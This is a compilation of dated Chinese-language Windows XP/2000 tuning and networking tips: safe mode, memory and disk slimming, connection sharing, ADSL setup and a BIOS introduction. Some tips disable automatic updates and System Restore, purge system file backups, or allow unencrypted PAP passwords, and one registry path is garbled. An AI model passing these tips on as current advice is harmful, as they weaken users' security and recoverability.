25:活用XP安全模式 
一、尝试到安全模式下检测不兼容的硬件 
　　XP由于采用了数字签名式的驱动程序模式，对各种硬件的检测也比以往严格，所以一些设备可能在正常状态下不能驱动使用。例如一些早期的CABLE MODEM，如果你发现在正常模式下XP不能识别硬件，可以在启动的时候按F8，然后选进入安全模式，在安全模式里检测新硬件，就有可能正确地为CABLE MODEM加载驱动了。 
二、卸载不正确的驱动程序 
　　一般的驱动程序，如果不适用你的硬件，可以通过XP的驱动还原来卸载。但是显卡和硬盘IDE驱动，如果装错了，有可能一进入GUI界面就死机；一些主板的ULTRA DMA补丁也是如此，因为Windows是要随时读取内存与磁盘页面文件调整计算机状态的，所以硬盘驱动一有问题马上系统就崩溃。此时怎么办呢？ 
　　我们可以进入XP的安全模式，安全模式中，Windows 使用默认设置（VGA 监视器、Microsoft 鼠标驱动程序、无网络连接、启动 Windows 所需的最少设备驱动程序），而且安全模式用最少的服务启动，这样错误的IDE和显卡驱动就不加载，你就可以删除引起问题的软件或硬件了，并用驱动还原来恢复系统了。在Windows9X里就没那么方便，所以XP虽然对硬件要求高了点，还是值得一用的。 
三、以安全模式修复致使连接状态中断的问题 
　　某些情况下，禁用管理员帐户可能造成维护上的困难。例如，在域环境中，当用于建立连接的安全信道由于某种原因失败时，如果没有其他的本地管理员帐户，则必须以安全模式重新启动计算机来修复致使连接状态中断的问题。 
　　如果试图重新启用已禁用的管理员帐户，但当前的管理员密码不符合密码要求，则无法重新启用该帐户。这种情况下，该管理员组的可选成员必须通过“本地用户和组”用户界面来设置该管理员帐户的密码。 
26:xp实用技巧/加速篇 
上次介绍了一些减肥的方法，现在介绍一些常用的、有效的加速方法。 
由于计算机软硬件配置不同，这里按照内存大小来区分加速方案，请大家根据自己的内存大小确定加速方案。选择前请大家先参照一般优化方案来优化你的系统。然后再按照特殊优化方案优化你的系统。 
一般优化方案 
一般优化方案可以适用于所有的系统配置， 推荐大家在使用下面的优化方案的时候先使用一般优化方案进行优化。优化方案介绍： 
注册表类： 
1.启用CPU L2 Cahce：HKCU_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management,新建Dword值：SecondLevelDataCache，修改这个值(填写的时候使用10进制，)为你的CPU的2级缓存的大小。 
2级缓存大小介绍 
AMD系列 Duron 64KB K6-3 Thunderbird AthlonXP 256KB K6-2 Athlon 512KB 
Intel系列 CeleronA Celeron2 128KB P2 Mobile P3E(EB) P4 Willamette 256KB P2 P3(katmai) P4(Northwood) 512KB 
举例说明：比如通过上表查的你的CPU的2级缓存是256KB，那么就修改Dword值SecondLevelDataCache为10进制的256即可。 
2.让IE使用多线程下载网页：注册表子键：HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Internet Settings，新建双字节值项“MaxConnectionsPerServer”，此项的作用是决定最大同步下载的连线数目，一般5～8个连线数目比较好。另外，对于HTTP 1.0服务器，可以加入名为“MaxConnectionsPer1_0Server”的双字节值项，其值也是设置最大同步下载的数目。 
驱动类： 
1.如果是Intel 8XX芯片组的话，一定要安装Intel Application Accelerator,安装以后系统优化很明显.这个东西可以到Intel官方网站下载。 
2.如果是非Intel芯片组的主板，安装相应的补丁程序是必不可少的。如VIA的4in1程序等等。 
3.尽量使用通过了WHL认证的驱动程序。这种驱动程序通过了微软硬件实验室的认证，在稳定性/兼容性有很大的优势。 
其他类： 
1.启动加速：虽然WindowsXP的启动速度有了很大的提高，但是还是有加速的余力的。到微软站点下载Bootvis.exe文件，启动它，依次选择菜单里面的Trace--Optimize System，这时候系统会提示是否重新启动，选择启动，重启登录以后什么都别动，过一段时间会自动弹出一个对话框，对话框上写着系统分析的意思，你什么都别做，要一直等到提示分析完毕以后才能够操作你的系统，分析时间有点长，请耐心等待。 
2.使用固定的虚拟缓存：建议把最大值和最小值都设置为382M，而不管你的物理内存的大小。 
3.确保内存使用优先用于程序，CPU计划优先用于程序。打开系统属性，打开“高级”选项卡，在“性能”栏里面点击设置按钮，打开性能选项对话框，然后打开高级选项卡，在处理器计划一栏里面选择程序，在内存使用一栏上选择程序，然后确定退出。 
特殊优化方案 
大于512M 256M--512M 128M--256M 
96M--128M 64M--96M 小于64M 
大于512M组的加速方案 
512M的内存容量对于WindowsXP是足够的了，即使开启所有的特效，也不会感到系统的迟缓，所以没有必要进行特定的优化，只需要参照一般优化措施进行就可以了。 
256M--512M组的加速方案 
如果你的内存大小介于512M和256M之间的话，那么WindowsXP在你的系统上跑的效果应该和512M内存组的效果差不多，区别只在如果同时运行几个大型应用程序，那么512M内存组的系统会更加流畅一点而已。一般情况下无需做什么优化，如果感觉到需要优化的话，请参照下一个组的优化方案来操作。 
128M--256M组的加速方案 
这个组的优化方案也适用于上面2个组的。 
优化方案：由于这个组的内存不是很大，有些时候系统会不停的使用虚拟内存，为了避免不停的读取硬盘造成硬盘过早的损坏，我们不得不采取一些措施来强制性的减少系统程序对内存的占用率………… 
96M--128M组的加速方案 
这个组的优化方案建立在上一个组的优化方案上，要先按照上一个组的优化方案优化以后才能够适用本组的优化方案。 
优化方案：这个组的内存已经算是比较小的了，虽然在这个容量上跑WinXP有点吃力，但是经过一番优化以后还是能够跑起来的，而不是走起来。这个优化反感还是建立在较少特效的基础上来做的………… 
64M--96M组的加速方案 
要使用这个组的优化方案，就先要使用上2个组的优化方案，不然不能够使用。 
优化方案：这个组的内存是很小的了，要在这个组上比较流畅的使用WindowsXP，就必须关闭所有特效。虽然关闭特效以后系统不是很好看，但是为了你能够流畅的使用你的WinXP，就必须有一点代价，代价就是关闭所有特效………… 
小于64M组的加速方案 
不要安装WindowsXP，除非您能够忍受极其缓慢的速度 
27:家庭用户内存优化指南 
　　好多人的家里只有一台计算机，主要用来上上网和玩游戏，并且配置也不是很高，如果装上了Windows XP，你的感觉可以用一个字来形容：慢！这就是我装完Windows体验版（Windows XP的中文名字）的一个体验。为什么这么慢呢，因为微软为了让你有新的体验，所以往Windows XP中加入了大量崭新的功能，比如：帮助中心，远程桌面，系统恢复，自动软件更新，Internet时间同步……，对于我而言，这些功能基本用不上，白白的耗了内存。要知道，大多人的机器仍然只有128M（虽然我的机器有384M的内存，但是我仍然讨厌无谓的浪费）！下面我们主要谈Windows XP的内存优化。 
　　我的Windows XP版本是Build2600，由于Windows XP是全球统一内码类型的产品，所以尽管它的界面是英文的，但是处理中文应然是游刃有余的。如果各位的Windows XP是中文版的，本文所介绍的步骤同样是可行的。 
　　首先让我们从系统属性对话窗开始 
　　我们将分别关闭“系统恢复”、“自动更新”和“远程桌面”功能。 
　　“系统恢复”虽然对经常犯错误的人有用，但是它会让你的硬盘处于高度繁忙的状态，你会发现你的硬盘总是忙个不停，因为Windows XP要记录的操作，以便日后恢复。如果你对自己有信心，那么就不要使用它，因为它可占不少内存。 
　　然后关闭“自动更新”功能。这个功能对一个时时刻刻都挂在网上的用户来说很适合，但是考虑到大多数家庭都是拨号上网，没有理由让这个功能长开着。何况，微软的升级也不是时时刻刻都有新的推出，我们每隔一段时间自己更新一下完全可以。我建议你将默认的自动升级改为确认升级方式，以便使你了解系统都做了些什么。 
　　接下来我们将“远程桌面”的功能也关闭。这个功能似曾相识，因为Windows 2000 Server就有一个Terminal Service来做同样的事情，我们可以从中发现微软的策略，在Windows 2000的时代，只有服务器版本的Windows 2000才带这个功能，而且名字也十分的专业，叫做终端服务，恐怕一般的用户不知道这个功能是干什么的。到了Windows XP，这个功能也被加到了Windows XP Home 和 Professional版本里来了，而且改了名字叫做“远程桌面”。顾名思义，这个功能就是让你可以让别人在另一台机器上访问你的桌面。可以说，在一个网络环境中，比如单位的局域网，这个功能很有用。比如你有问题了可以向同事求助，他可以不用到你的跟前，直接通过“远程桌面”来访问你的机器帮你解决问题。但是在家里面，通常只有一台计算机，这个功能就显得多余了，所以微软又赋予了它新的功能叫做“快速用户切换”，就是你可以不用注销你的用户让另一个人以其他用户的身份注册来使用你的计算机。我个人怀疑它的实用价值，大多数人使用计算机都没有用户的概念，计算机用就用呗，还分什么用户。所以我的意见还是关掉它，否则你不用它就等于白白浪费内存。 

下面我们再看看“系统属性”中的“高级”选项卡，首先是“性能”的设置 

　　在省缺的状况下，Windows XP是按照最佳的视觉效果来配置的，如果你觉得你的系统尤其是显示部分十分的缓慢的话，建议你改改，下面是我的配置： 
接下来看看“启动与恢复”的设置： 
　　尽管Windows XP十分的稳定，但是也有崩溃的时候。如果在你的系统崩溃是你发现你的硬盘使劲儿的响，那是因为Windows XP正在写DUMP文件呢，对我们来说，如果你不打算把这个文件寄给微软，那么它又有什么用呢？所以我的建议还是关闭： 
最后来看看“错误报告”功能。 

　　这个功能可以在你的Windows XP发生错误的时候，系统自动收集一些错误资料然后发送给微软公司，以便其完善他们的操作系统。这个功能对于一个拨号上网的用户而言十分的不适合，因为谁会花着自己的钱同时浪费着自己的时间去发送这些十分巨大的而且只对微软公司有用的数据呢？如果这个功能对你没有用，那又何必让它占用着你的内存呢？ 
最后，我们来看看还有哪些多余的功能。安装图示进入系统的服务列表： 

　　如果你的家里没有打印机，你可以将“Printer Spooler”服务关闭掉。如果你没有定期执行的任务，将“Task Scheduler”服务关闭掉。对于大多人而言，“Remote Registry”同样没有用，也可以关闭掉。下面是经过上面所有优化后的服务列表，我将优化过的地方用红颜色的圆圈标记了出来： 
优化后，Windows XP启动后大约占用60M左右的内存： 
　　此外，大家看到这里我只关心每个应用程序的“虚拟内存”（VM Size）使用情况，而不是“内存使用”（Memory Usage）。原因是只有“虚拟内存”才被统计到“内存使用”（Commit Charge）数据中去，就是大家在状态栏看到的统计值。我们可以做一小试验来验证我的说法，我们启动WORD，记录一下它的内存使用和系统总的内存使用，然后最小化这个WORD，在检查一下它的内存使用和系统总的内存使用，结果如下： 
　　最小化之前的内存记录 
　　上图为最小化后的内存记录。 
　　不难发现，“MemoryUsage”随着WORD的最小化变小了，而“VM Size”没有变化，并且系统总的内存使用并没有随着WORD的最小化而变化。这就是为什么我只关心“VM Size”的原因。希望大家察看内存的时候能够注意一下，VM Size才是准确的数字。 
　　由于本文关注的是Windows XP下的系统优化，所以对一些大家耳熟能详的节约内存的方法，比如不使用壁纸，我就不写出来让大家浪费时间了。另外，大家可能会说，你把Windows XP的特色功能都关闭了，那还是Windows XP吗？其实这一点我也知道，不过鱼和熊掌不能兼得，如果你的机器配置很高档，如果你觉得你得Windows XP运行的不慢，你当然可以使用Windows XP的省缺配置了，毕竟这是微软推荐的使用方法嘛。不过，即便你关闭了我所提到的这些功能，Windows XP仍然有大量的新的功能等着你，比如崭新的资源管理器真的是十分的与众不同，所以，优化完的系统还是Windows XP ！ 
28:减肥加速 
Windows XP安装完毕以后至少要占用1.5G的硬盘空间，虽然现在硬盘价格一落再落，但是还是有众多朋友使用的硬盘空间不够，即使勉强安装了Windows XP，也不能够安装其他应用软件，怎么办？加硬盘？没钱！不使用Windows XP？心里面不舒服！其实经过我们一番处理以后，Windows XP只需要1G左右的硬盘空间就足够了。 
是不是感到很意外？其实要达到这个目标是需要有一定基础的。首先内存大小至少要满足128M，其次要有一张完整版本的Windows XP的安装光盘（最好是没有破解的Windows XP光盘，能够使用正版的Windows XP镜像光盘当然更好），第三是要有一点计算机使用经验，这里的经验不是指只会打游戏，而是要知道如何调整计算机软件设置。有了以上3点以后就可以开始减肥了。 
首先用查找功能搜索sysoc.inf（位于windows目录里面） ，找到以后用记事本打开，然后用替换功能替换.hide为空 
然后打开控制面板--〉添加/删除程序--〉添加/删除Windows组件，是不是可以看到有一些新的可添加/删除的东西出来。注意：有一些东西是不能够卸载的，如IE，不要为了节省几十M的硬盘空间而导致系统崩溃，这是划不来的。具体那些可以卸载你可以根据自己的需要来决定。如：我不需要索引服务，我就可以把它卸载。 
Windows XP减肥加速系列--------减肥篇（2） 
刚刚只是小试牛刀,大的动作现在才开始。 
Windows XP有一个驱动程序包叫做driver.cab，大概有74M，CAB包里面全部是驱动程序，如果我们今后不再需要安装驱动程序，也就是说今后没有硬件设备添加，那么这个体积如此巨大的CAB包是可以不要的。这个驱动程序包位于windows\driver cache\ i386目录里面，直接删除即可。简单不？ 
WinME有一个系统还原很是讨厌，WindowsXP也有这个功能，不过WindowsXP的系统还原比WinME的要好用，一是因为占用的空间比WinME的少，二是因为还原的很彻底，三是因为可以随机调整空间大小。不过，系统还原的确好用，不过有多少人会使用这个功能，而且对于硬盘空间狭小的用户来说，系统还原简直是一个吃盘怪兽，禁用的确很简单，但是如果要保留怎么办？这更简单了。 
按下快捷键WinKey+Pause/Break就可以调出系统属性来，打开系统还原标签页，选中你要修改的盘符，然后点击设置就可以调整占用空间大小。Windows XP默认为占用12%的磁盘空间，如果你的这个分区很大的话，那么你算算12%有多少了？一般限制在400M就差不多了（建议只监测Windows XP系统安装盘，其他的分区可以不监测，因为如果你还原了系统安装盘，你在其他分区上安装的软件也就很难再运行了，这个时候就可以手工删除安装目录，然后重新安装软件）。如果你放弃很早的系统还原资料怎么办？很简单，打开开始--〉程序--〉附件--〉系统工具--〉瓷盘清理，然后选择Windows XP安装盘，点击确定，系统会自动扫描，扫描完以后不要忙着点确定，打开其他选项标签页，按最下面的那个清理按钮（图），然后系统会提示是不是删除早期的系统还原点，确认就继续，否则取消。这一招很有效，推荐经常使用。然后回到磁盘清理标签页，建议把IE临时文件这个复选框也选中，这样又可以使你的硬盘可用空间增多。 
OK!经过这一番整理以后你的可用空间是不是有多了一些？以上操作只节省了不超过200M的空间，我们的目标是节省500M的空间，那么剩下的300M空间从哪里找出来呢？请继续往下看。 
Windows XP减肥加速系列--------减肥篇（3） 
要实现终极目标，就要使用非常规做法！当然，非常规做法是很危险的，建议大家谨慎使用！！ 
运行cmd打开命令提示行窗口，然后输入sfc /purgecache<回车>，这样操作以后就可以清理出大概300M的空间，是不是有点恐怖？其实也没有设么？这个命令是用于清理dllcache里面的文件的，dllcache是WindowsXP的一个重要文件备份目录，里面有Windows XP的重要文件的备份，如果哪一个文件损坏了，系统就会自动的用备份的文件替换损坏的文件以达到保持系统稳定的目的。这个目录在Win2000里面也同样存在，所以这个方法也可以用于win2000。先前我曾经提出了3个要求，其中有一个就是要有1张完整的Windows XP安装光盘，这张光盘就是为这里准备的。如果哪一天系统要求插入Windows XP安装光盘，那么你就可以插入这样光盘，我还提出最好是没有破解的安装光盘，这是因为WindowsXP安装程序有数字签名，一旦被破解以后，数字签名丧失，系统就不会使用这个文件，所以说最好是一张没有破解的Windows XP的安装光盘。 
上述操作以最后一种最为危险，但是也最能够达到目的，我再次提醒大小小心使用最后方法，这种方法很危险！！ 
另外再提供几种增加可用空间的方法： 
1.禁用休眠功能。休眠功能是把你的内存里面的所有数据全部存储在硬盘上，然后关机。占用的空间和你的内存大小一致。你可以在控制面板--〉电源选项里面找到是否启用休眠功能。 
2.删除不需要的桌面背景。它位于WINDOWS\Web\Wallpaper目录下 
3.可以删除一些LOG文件。具体那些能够删除，那些不能够要看你自己的决定了。 
4.打开系统信息，然后找到工具菜单下的Dr.Waston（华生医生），打开以后取消除了附加现有日志文件以外的所有复选框。 
5.打开系统信息--〉高级标签页，然后点击启动与故障恢复下的设置按钮，在系统失败下的写入调试信息下拉选框中选中无或小内存转储，然后确定推出（图）。 
6.修改页面虚拟内存（系统属性--〉高级--〉性能--〉设置--〉高级--〉虚拟内存--〉更改）为自定义！最好不小于256M，不大于382M。而且最大值和最小值最好一样（图）。还不要忘记，修改好以后要点击右边的设置按钮，然后才能够点击确定，否则无效。 
29:控制台命令详解 
　　Win XP（包括2000）的控制台命令是在系统出现一些意外情况下的一种非常有效的诊断和测试以及恢复系统功能的工具。小编的确一直都想把这方面的命令做个总结，这次辛苦老范给我们整理了这份实用的秘笈。 
第一部分：文件和目录操作命令 
　　Attrib　　　Batch　　　　　Chdir (Cd) 
　　Copy　　　　Delete (Del)　　Expand 
　　Mkdir (md)　Rmdir (Rd)　　　Type 
　　More 
第二部分：系统和磁盘操作命令 
　　Bootcfg　　　hkdsk　　　Diskpart 
　　 
　　Fixboot　　　Fixmbr　　　format 
　　Map　　　　　 
第三部分：辅助操作和特殊功能命令 
　　Cls　　　　　Disable　　　Enable 
　　 
　　Exit　　　　Help　　　　　commandname 
　　Listsvc　　　Logon　　　　Net use 
　　Set　　　　　Systemroot 
win98 win200 共享上网全攻略
WinGate和Internet连接共享的最佳配合 
提起共享上网来，很多人都会想到WinGate，该软件最大的优点是：通过缓存网页内容，加快了浏览速度。然而，很多用户发现在WinGate的配置很麻烦，想要使用QQ、Foxmail、网络蚂蚁、网际快车、CuteFTP等软件不下一番功夫还真不行！而且，光设置好服务器还不行，客户机也要做相应的设置，非常麻烦。如何才能即利用WinGate的缓存，加快浏览速度，又不用进行复杂的配置呢？在建设恩平电大校园网的过程中，我们找到一个好办法：WinGate和Windows自带的连接共享的合用。具体做法如下： 
1、安装“Internet连接共享”
安装之前，请确认你的局域网是连通的，并准备好一张软盘。Windows的“Internet连接共享”安装过程比较简单，按照提示操作即可。如果系统里没有“Internet连接共享”，可以通过“添加/删除程序→Windows组件→Internet工具”进行添加。 
2、安装WinGate
软件的安装比较简单，一路回车即可，这里就不多介绍了。服务器使用Windows 2000或Windows 98都可以，要注意的是，不同的操作系统需要安装对应版本的WinGate。 
3、WinGate的配置
进入WinGate的使用界面后，主要设置一下WinGate的缓存属性，缓存的大小设置为不小于500MB即可使用。 
4、IE浏览器的配置
运行IE浏览器，打开Internet选项，进行局域网设置，设置如图2，这里我们的服务器的IP地址为192.168.0.1，端口为80，确定回车。 
配置完毕后，我们即可同时运行WinGate和Windows的连接共享来完成代理服务器的功能。使用中将两者放入启动目录，服务器打开即可运行使用。现在我们可以在Internet中使用QQ、Foxmail、CuteFTP、网络蚂蚁等软件了。此时，服务器利用WinGate为客户机提供网页的浏览服务，而通过Windows自带的连接共享为客户机提供QQ、邮件、上传、下载等服务。因此我们在使用中不但能享受上网冲浪的快捷，也避免了许多不必要的设置。 
还有一点必须注意，如果你的服务器在单位中还担当局域网的Web服务器、FTP 服务器、邮件服务器的话，如使用Windows 2000的IIS 5.0，安装WinGate后，你会发现局域网的FTP和局域网电子邮件无法使用，别着急，完成以下配置后即可使用。 
1、运行服务器的WinGate，删除WinGate中的除WWW Proxy Server服务器外的所有用户服务器。 
2、改变WinGate中WWW Proxy Server的端口为8080。 
3、最后参照前面IE浏览器的Internet选项中局域网设置的方法，将客户机的端口改为8080即可。 
通过以上设置可以使用你们单位以前的各种局域网服务功能了。朋友，怎么样，想试试请赶快动手吧 
利用Win 2K实现Internet连接共享 
　　上个月公司联网了，要求所有用户计算机通过服务器共享Internet连接。对于我这个网管来说，迫切需要实现Http、Ftp、POP3、Smtp等功能，同时同事还要我给他们开通Oicq，以便休息时间可以聊天。 
　　用什么代理工具好呢？这颇费了我一番时间研究，常用的代理软件有MS Proxy 2.0、Wingate、Sygate等等。MS Proxy 2.0和Wingate配置太过复杂，而且还要在客户端安装软件，先被否决了。去临近的单位考察了一下Sygate 4.0，发现很不错，已经初步决定用Sygate 4了。转折点是前两天为了提高服务器的稳定性，把服务器重新安装了一遍，升级成为Win2000服务器版。 
　　在阅读Win2000帮助信息时，无意中发现Win2000自带了Internet连接共享功能，试用以后发现真的不错，Http、Ftp、POP3、Smtp和Oicq等功能都能实现。不敢独享，和大家共同探讨一下。 
　　一．服务器上Win2000的安装配置 
　　1.Win2000使用典型安装完毕，配置为主域服务器。并配置网卡的ip为192.168.0.1，子网为255.255.255.0，将此网卡连接到服务器所在的网络，使用TCP/IP协议。在现有的网络中，不应该将此功能与其他 Windows 2000 Server 域控制器、DNS 服务器、网关、DHCP 服务器，或配置为静态 IP 地址的系统一起使用。 
　　2.添加域名服务系统（DNS）
　　通过 控制面板－>添加删除程序－>网络服务－>域名服务系统（DNS）－>打勾－>确定来添加。如图所示： 
　　二．服务器上添加连接到Internet的连接 
　　我目前是通过服务器端modem拨号上网的方式来实现的。要注意的是配置 Internet 连接共享，必须以 Administrators 组的成员来登录服务器。 
　　1.安装modem 
　　通过 控制面板－>电话和调制解调器选项－>添加 来添加外置modem 
　　2.添加拨号连接 
　　通过 控制面板－>网络和拨号连接选项－>新建新连接－>出现网络连接向导 
　　在网络连接向导中选－>单击"下一步"－>选拨号到Internet－>单击"下一步"－>出现Internet连接向导。 
　　在Internet连接向导中－>选手动设置Internet连接或通过局域网连接－>单击"下一步"－>通过电话线和调制解调器连接-->单击"下一步"-->输入ISP提供的上网电话号码-->单击"下一步"－>输入ISP提供的用户名和密码-->单击"下一步"－>单击"下一步"－>问是否建立邮件帐号时选否－>单击"下一步"－>完成。 
　　3. 共享Internet的连接 
　　在新建立的拨号连接帐号上点击右键-->选属性-->共享访问-->在"启动此连接的Internet连接共享"打勾-->确定。 
　　三、在服务器和客户机器上配置Internet连接共享的Internet选项 
　　1.打开 Internet Explorer-->单击"手工设置 Internet 连接，或者通过局域网 (LAN) 连接"，-->单击"下一步" --> "通过局域网 (LAN) 连接" -->单击"下一步"--> 单击"自动查找代理服务器（推荐）"复选框-->单击"下一步" -->单击"否" -->单击"下一步"" -->单击"完成"。
　　2.在"连接"选项卡上，单击"不进行拨号连接"，然后单击"局域网设置"。 
　　3.在"自动配置"中，清除"自动检测设置"和"使用自动配置脚本"复选框。 
　　4.在"代理服务器"中，清除"使用代理服务器"复选框。 
　　四、在客户机上设置网卡配置 
　　配置客户机的网卡为自动获得IP地址，网关为空。
　　到此配置完毕，重新启动服务器和客户机。服务器上拨号上网，在客户机上登录服务器后，就可以通过服务器的代理实现各种Internent功能了。 
Win98SE的Internet共享！ 
在Win98SE没有出现以前，大家都在使用Sygate、Wingate等网关工具来实现上网共享。Win98SE（第二版）本身也包含了共享上网工具——“Internet连接共享”，它的功能虽不如Wingate等软件来得强大，但却非常实用。 
　　在使用之前，大家必须先配置好自己的局域网，注意这个局域网必须是建立在TCP/IP协议的基础上，用IPX/SPX协议无法实现Internet共享功能，配置的局域网可ping一下主机的IP地址和本地的IP地址，以检查局域网是否工作正常（主机和本地的IP地址可由winipcfg这个命令得到）。 
　　一、主机的安装 
　　“Internet连接共享”主机上必须安装下述组件： 
　　Microsoft网络用户 
　　Internet连接共享 
　　拨号适配器（Internet适配器） 
　　第二个网络适配器（本地网卡） 
　　“Internet连接共享”和本地适配器的TCP/IP 
　　Internet连接共享需要最后安装，等一切设置好，并且设立了拨号连接，而且最好选择保存口令选项后，最后再装Internet连接共享。 
　　1.安装Internet连接共享 
　　打开“Windows安装程序”选项卡下的“添加/删除程序属性”对话框。 
　　单击“Internet工具”，然后单击“详细资料”。 
　　选择“Internet连接共享”，然后单击“确定”。 
　　按照“Internet连接共享向导”的提示进行操作。 
　　如果是第一次使用，系统自动启动“Internet连接共享向导”。“Internet连接共享向导”将连接共享计算机的IP地址设置为192.168.0.1。网络上的其他计算机可以静态设置为192.168.0.2到192.168.0.253之间的任何IP地址。期间会让你选择主机的上网方式、上网自动运行的拨号连接以及上Internet所用的网络适配器。最后会要求插入一张软盘，做网络其他计算机的共享配置磁盘。用这张软盘就可以自动配置共享上网用户。 
　　系统重新启动后，单击“开始”，指向“设置”，单击“控制面板”，然后再双击“Internet选项”，单击“连接”选项卡，看到“局域网设置”下多了个“共享”按钮，打开“共享”按钮，便是如下选择： 
　　选项 描述 
　　启用Internet连接共享（打钩选择） 打开或关闭该计算机上的Internet连接共享。 
　　在任务栏显示图标 向系统区内添加Internet连接共享。图标实时指明相互连接的计算机数量，同时还包括Internet连接共享选项的快捷菜单。 
　　选择用来访问Internet的拨号连接 选择首选选项。 
　　选择用来访问您的局域网络的网络适配器 选择首选选项。 
　 
　　二、客户机的安装 
　　在每一台客户端计算机上必须安装下述组件： 
　　Microsoft网络用户 
　　网络适配器（本地网卡） 
　　TCP/IP 

　　（1）软盘配置： 
　　1.将在连接共享计算机上安装Microsoft Internet连接共享时制作的软盘插入您的的软盘驱动器中。 

　　2.单击“开始”按钮，然后单击“运行”。 
　　3.键入：a:\icsclset.exe 
　　4.单击“确定”。 
　　（2）TCP/IP设置： 
　　要使用连接共享计算机访问Internet，请按照下述步骤确保将网络适配器的TCP/IP设置正确。 
　　1.在“控制面板”中，双击“网络”图标。 
　　2.在“网络组件”列表中，单击与您的网络适配器有关联的TCP/IP，然后单击“属性”。 
　　3.选中“自动获取IP地址”复选框。 
　　4.单击“WINS配置”选项卡，然后选中“使用DHCP进行WINS解释”旁边的复选框。 
　　5.单击“网关”选项卡，然后删除可能列出的所有已安装的网关。 
　　6.单击“DNS配置”选项卡，然后选中“禁用DNS”旁边的复选框。 
　　7.单击“确定”接受新的TCP/IP设置。 
　　8.单击“确定”更新新的网络配置。 
　　另外对可以连接到Internet的应用程序进行配置（如Internet Explorer或Outlook Express），使用局域网络而不是直接连接到Internet。 
　　好了一切就绪，Win98SE的Internet连接共享最大的特点是不管主机是否上网，局域网上的机器都会自动调用主机的拨号连接，非常的方便，不过前提是主机必须预先配置好拨号连接，并让系统记口令。 
[b]如何在WIN2000下设置和共享ADSL [b] 
　　ADSL的硬设备安装其实并没有多少奥妙，简单说就是用一块网卡把电脑和ADSL MODEM连接起来而已。而且ADSL的入户安装，大多数线路提供商都将专门派遣技术人员到用户家中去现场安装、调试，根本用不着用户亲力而为，故在此就不再多说。本文重点介绍的将是在Windows 2000环境下的个人用户和在局域网中如何使用ADSL的设置方法（在WIN98下的具体设置方法，ADSL自带用户手册中有详细的介绍）。 
（注：本文以国内最常见的Alcatel ADSL MODEM为例，以下设置方法同样适用于普通单机用户。） 
1.首先在桌面上用鼠标右键点击“网上邻居”，弹出快捷菜单，选中“属性”选项。 
2.点击“属性”选项，打开“网络和拨号连接”窗口，用鼠标右键点击“本地连接”，选中“属性”选项。 
3.点击“属性”选项，打开“本地连接属性”窗口，选中组件窗口中的“Internet协议（TCP/IP）”，选中“属性”选项。 
4.点击“属性”选项，打开“Internet协议（TCP/IP）属性”窗口，填入内部局域网的IP地址以及子网掩码，点击“确定”（填入的DNS服务器地址由当地ISP预先提供）。 
5.在“网络和拨号连接”窗口中，右键点击“新建连接”图标，选中“新建连接（N）…”。 
6.点击“新建连接（N）…”，打开“网络连接向导”窗口。 
7.点击“下一步”，在“如下选择”中选中“通过Internet连接到专用网络一项”。 
8.点击“下一步”，在地址栏中填入连接服务器端的地址（填入的IP地址由当地ISP预先提供）。 
9.点击“下一步”，如果是单机上网选择“只是我自己使用此连接”，局域网则选“所有用户使用此连接”。 
10.点击“下一步”，并在空白处键入连接名称为连接取名，最后点击“完成”。 
11.点击“连接***”图标，打开“连接***”窗口，选中并点击“属性”选项。 
12.在打开的窗口中的常规中再次填入连接的主机服务器的地址（填入的IP地址由当地ISP预先提供） 。 
13.点击“安全措施”，在该选项卡中选中“高级”。 
14.点击“设置”按钮，在“数据加密”中选取“可选加密（没有加密也可以连接）”，再选取“允许这些协议”中“不加密的密码（PAP)”。 
15.点击“确定”，在弹出的窗口中点击“是（Y）”。 
16.在“网络”选项卡中的组件窗口选中“Internet协议（TCP/IP）”，并点击“属性”。 
17.在属性窗口中选择“自动获得IP地址”和“自动获得DNS地址”，并点击“高级（V）…”。 
18.在“高级TCP/IP设置”窗口中的“常规”选项卡中选择“在远程网络上使用默认网关”（必须），之后点击“确定”结束。 
完成上面的设置后就可以进行拨号过程了。值得注意的是，Ericsson ADSL MODEM的设置和Alcatel ADSL MODEM有少许不同，Ericsson 的设置中不再需要定制“本地连接”，其他设置与 Alcatel ADSL MODEM设置基本类似。 
BIOS教程
什么是BIOS 
计算机用户在使用计算机的过程中，都会接触到BIOS，它在计算机系统中起着非常重要的作用。
BIOS，完整地说应该是ROM－BIOS，是只读存储器基本输入／输出系统的简写，它实际上是被固化到计算机中的一组程序，为计算机提供最低级的、最直接的硬件控制。准确地说，BIOS是硬件与软件程序之间的一个“转换器”或者说是接口(虽然它本身也只是一个程序)，负责解决硬件的即时需求，并按软件对硬件的操作要求具体执行。
　一、BIOS的功能 
　　从功能上看，BIOS分为三个部分：
　　1.自检及初始化程序；
　　2.硬件中断处理；
　　3.程序服务请求。
　　下面我们就逐个介绍一下各部分功能： 
　　(一)自检及初始化
　　这部分负责启动计算机，具体有三个部分，第一个部分是用于计算机刚接通电源时对硬件部分的检测，也叫做加电自检(POST)，功能是检查计算机是否良好，例如内存有无故障等。第二个部分是初始化，包括创建中断向量、设置寄存器、对一些外部设备进行初始化和检测等，其中很重要的一部分是BIOS设置，主要是对硬件设置的一些参数，当计算机启动时会读取这些参数，并和实际硬件设置进行比较，如果不符合，会影响系统的启动。
　　最后一个部分是引导程序，功能是引导DOS或其他操作系统。BIOS先从软盘或硬盘的开始扇区读取引导记录，如果没有找到，则会在显示器上显示没有引导设备，如果找到引导记录会把计算机的控制权转给引导记录，由引导记录把操作系统装入计算机，在计算机启动成功后，BIOS的这部分任务就完成了。 
　　(二)程序服务处理和硬件中断处理
　　这两部分是两个独立的内容，但在使用上密切相关。
　　程序服务处理程序主要是为应用程序和操作系统服务，这些服务主要与输入¥þ输出设备有关，例如读磁盘、文件输出到打印机等。为了完成这些操作，BIOS必须直接与计算机的I／O设备打交道，它通过端口发出命令，向各种外部设备传送数据以及从它们那儿接收数据，使程序能够脱离具体的硬件操作，而硬件中断处理则分别处理PC机硬件的需求，因此这两部分分别为软件和硬件服务，组合到一起，使计算机系统正常运行。
　　BIOS的服务功能是通过调用中断服务程序来实现的，这些服务分为很多组，每组有一个专门的中断。例如视频服务，中断号为10H；屏幕打印，中断号为05H；磁盘及串行口服务，中断14H等。每一组又根据具体功能细分为不同的服务号。应用程序需要使用哪些外设、进行什么操作只需要在程序中用相应的指令说明即可，无需直接控制。 
二、BIOS的种类 
